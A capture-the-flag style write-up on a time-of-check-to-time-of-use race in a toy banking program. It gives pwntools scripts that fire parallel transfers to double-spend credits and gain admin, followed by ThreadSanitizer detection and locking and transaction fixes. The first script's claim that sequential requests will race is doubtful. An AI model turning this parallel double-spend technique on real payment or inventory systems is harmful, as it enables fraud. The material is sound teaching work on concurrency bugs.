# Challenge 21: Race Condition / TOCTOU

## Difficulty: Medium-Hard

## Vulnerability Type: Time-of-Check-Time-of-Use (TOCTOU) Race Condition

## Description
A banking system with a race condition in the credit transfer function. Multiple simultaneous transfers can bypass the balance check, allowing double-spending.

## Protections
- **NX**: Enabled
- **PIE**: Disabled
- **Canary**: Disabled
- **RELRO**: Partial

## Vulnerability Analysis

### The Bug (TOCTOU)
```c
// Check credits WITHOUT lock
if (users[from].credits < amount) {
    return;  // Fail if insufficient
}

usleep(100000);  // Delay increases race window

// Deduct credits WITH lock (but no re-check!)
pthread_mutex_lock(&lock);
users[from].credits -= amount;
users[to].credits += amount;
pthread_mutex_unlock(&lock);
```

### The Problem
Between check and use, state can change:
1. Thread A checks: User 0 has 10 credits ✓
2. Thread B checks: User 0 has 10 credits ✓
3. Thread A deducts: User 0 now has 0 credits
4. Thread B deducts: User 0 now has -10 credits (underflow!)

Result: User 0 transferred 20 credits despite having only 10!

## Race Condition Mechanics

### Time-of-Check-Time-of-Use
```
Time  Thread 1              Thread 2
----  ------------------    ------------------
  1   Check balance (OK)
  2                         Check balance (OK)
  3   Sleep...
  4                         Sleep...
  5   Deduct (10 -> 0)
  6                         Deduct (0 -> -10)
```

### Why usleep() Helps Exploitation
The deliberate delay widens the race window, making it easier to trigger.

## Exploitation Strategy

### Step 1: Create Users
```python
# Create user 0 (has 10 credits)
choice = 1
username = "victim"

# Create user 1 (receives credits)
choice = 1
username = "receiver"
```

### Step 2: Trigger Race Condition
Send multiple transfer requests simultaneously:
```python
# Transfer 10 credits from user 0 to user 1
# Do this MANY times simultaneously
# Some will pass the check before any deduction happens
```

### Step 3: Accumulate Credits
After successful race exploitation:
- User 0: negative credits (or 0)
- User 1: 100+ credits (if we triggered 10 races)

### Step 4: Buy Admin
```python
choice = 3  # Buy admin
user_idx = 1  # User with credits
```

## Complete Exploit

```python
#!/usr/bin/env python3
from pwn import *
import threading
import time

elf = ELF('./challenge')

def create_user(p, name):
    p.sendlineafter(b'Choice: ', b'1')
    p.sendlineafter(b'Username: ', name.encode())

def transfer(p, from_idx, to_idx, amount):
    p.sendlineafter(b'Choice: ', b'2')
    p.sendlineafter(b'index: ', str(from_idx).encode())
    p.sendlineafter(b'index: ', str(to_idx).encode())
    p.sendlineafter(b'Amount: ', str(amount).encode())

def buy_admin(p, user_idx):
    p.sendlineafter(b'Choice: ', b'3')
    p.sendlineafter(b'index: ', str(user_idx).encode())

def check_admin(p, user_idx):
    p.sendlineafter(b'Choice: ', b'5')
    p.sendlineafter(b'index: ', str(user_idx).encode())

# Main exploit
p = process('./challenge')

# Create two users
create_user(p, 'alice')  # User 0 - has 10 credits
create_user(p, 'bob')    # User 1 - receives credits

# Launch multiple transfers in parallel
# Each transfer will check that user 0 has >= 10 credits
# If we send many requests quickly, multiple will pass the check
# before any deduction happens

# Method: Send many transfer commands rapidly
for i in range(150):  # Send 150 transfer requests
    transfer(p, 0, 1, 10)  # Transfer 10 from alice to bob
    # Due to race condition, many of these will succeed
    # despite alice only having 10 credits

# Check results
p.sendlineafter(b'Choice: ', b'4')  # Show users
response = p.recvuntil(b'Choice: ')
print(response.decode())

# If bob has >= 1000 credits, buy admin
buy_admin(p, 1)

# Check admin and get flag
check_admin(p, 1)

p.interactive()
```

### Better Exploit: Parallel Connections

```python
#!/usr/bin/env python3
from pwn import *
import threading

def transfer_thread(host, port):
    try:
        p = remote(host, port)
        # Navigate to transfer
        p.sendlineafter(b'Choice: ', b'2')
        p.sendlineafter(b'index: ', b'0')
        p.sendlineafter(b'index: ', b'1')
        p.sendlineafter(b'Amount: ', b'10')
        p.close()
    except:
        pass

# Assuming service is listening
HOST = 'localhost'
PORT = 9021

# First, create users via main connection
p = remote(HOST, PORT)
p.sendlineafter(b'Choice: ', b'1')
p.sendlineafter(b'Username: ', b'alice')
p.sendlineafter(b'Choice: ', b'1')
p.sendlineafter(b'Username: ', b'bob')

# Launch many parallel transfer attempts
threads = []
for i in range(100):
    t = threading.Thread(target=transfer_thread, args=(HOST, PORT))
    t.start()
    threads.append(t)

# Wait for all threads
for t in threads:
    t.join()

# Check results and buy admin
p.sendlineafter(b'Choice: ', b'4')
p.recvuntil(b'Credits: ')
credits = int(p.recvline().split()[0])

log.info(f"Bob's credits: {credits}")

if credits >= 1000:
    p.sendlineafter(b'Choice: ', b'3')
    p.sendlineafter(b'index: ', b'1')
    p.sendlineafter(b'Choice: ', b'5')
    p.sendlineafter(b'index: ', b'1')

p.interactive()
```

## Automated Detection

### Static Analysis
Look for:
```c
// Check outside lock
if (resource.available) {
    // Gap!
    lock();
    resource.use();
    unlock();
}
```

### Dynamic Analysis
- ThreadSanitizer (TSan): Detects data races
```bash
gcc -fsanitize=thread challenge.c -o challenge
./challenge
# Will report: WARNING: ThreadSanitizer: data race
```

### Fuzzing with Concurrency
```bash
# AFL++ with threading support
# Or custom fuzzer that makes parallel requests
```

## Real-World Examples

### Finance
- Double-spending attacks
- ATM withdrawal races
- Online payment races

### File Systems
- TOCTOU in privilege checks
- CVE-2016-5195 (Dirty COW)

### Web Applications
- Session races
- Inventory over-selling
- Coupon code reuse

## Prevention

### Proper Locking
```c
// Check AND use within same critical section
pthread_mutex_lock(&lock);
if (users[from].credits < amount) {
    pthread_mutex_unlock(&lock);
    return;
}
users[from].credits -= amount;
users[to].credits += amount;
pthread_mutex_unlock(&lock);
```

### Atomic Operations
```c
// Use atomic compare-and-swap
atomic_compare_exchange_strong(&credits, &expected, new_value);
```

### Database Transactions
```sql
BEGIN TRANSACTION;
SELECT credits FROM users WHERE id=? FOR UPDATE;
-- Check and update atomically
UPDATE users SET credits=credits-? WHERE id=?;
COMMIT;
```

## Learning Objectives
- Race condition fundamentals
- TOCTOU vulnerabilities
- Multi-threading issues
- Proper synchronization
- Atomicity requirements

## Advanced Topics

### Narrowing the Race Window
Without `usleep()`, race is harder to trigger:
- Need faster parallel requests
- More attempts required
- Timing-sensitive

### Integer Underflow
If credits go negative:
```c
users[from].credits -= amount;
// If credits unsigned and goes negative, wraps to huge number!
```

### Mitigation Bypass
Even with locks, can have issues:
- Lock granularity problems
- Deadlock vs race tradeoff
- Performance vs security

## Testing Race Conditions

### Tools
- ThreadSanitizer (TSan)
- Helgrind (Valgrind)
- Concurrency testing frameworks

### Techniques
- Stress testing
- Timing variation
- Parallel fuzzing

## Further Reading
- "Effective Concurrency" by Herb Sutter
- "The Art of Multiprocessor Programming"
- CERT Secure Coding: CON (Concurrency)
- "Dirty COW" CVE analysis
